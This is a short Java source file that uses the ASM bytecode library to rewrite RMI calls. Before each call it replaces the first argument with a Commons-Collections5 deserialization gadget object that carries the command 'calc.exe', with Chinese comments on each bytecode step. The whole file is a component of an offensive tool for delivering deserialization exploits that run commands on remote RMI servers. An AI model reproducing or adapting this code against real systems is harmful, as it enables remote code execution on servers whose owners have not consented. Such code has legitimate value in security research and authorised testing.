package teu.rasp.visitorAdapter;

import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.commons.AdviceAdapter;

public class RMIInterceptorVisitorAdapter extends AdviceAdapter {
    public RMIInterceptorVisitorAdapter(MethodVisitor mv, int access, String name, String desc) {
        super(Opcodes.ASM5, mv, access, name, desc);
    }
    protected void onMethodEnter(){
        mv.visitVarInsn(ALOAD, 3);//从变量池中弹出第三个变量：Object[] args，并进入操作栈
        mv.visitInsn(ICONST_0);//把常数0放入操作栈，表示要改变的是args[0]
//        mv.visitLdcInsn("altering RMI SPEAKING!");
        mv.visitLdcInsn("calc.exe");//把字符串入操作栈
        mv.visitMethodInsn(INVOKESTATIC, "teu/rasp/util/commonscollections5", "getObject", "(Ljava/lang/String;)Ljavax/management/BadAttributeValueExpException;", false);
        //调用方法
        mv.visitInsn(AASTORE);//把结果放入变量池顶部，完成参数覆盖

    }
}
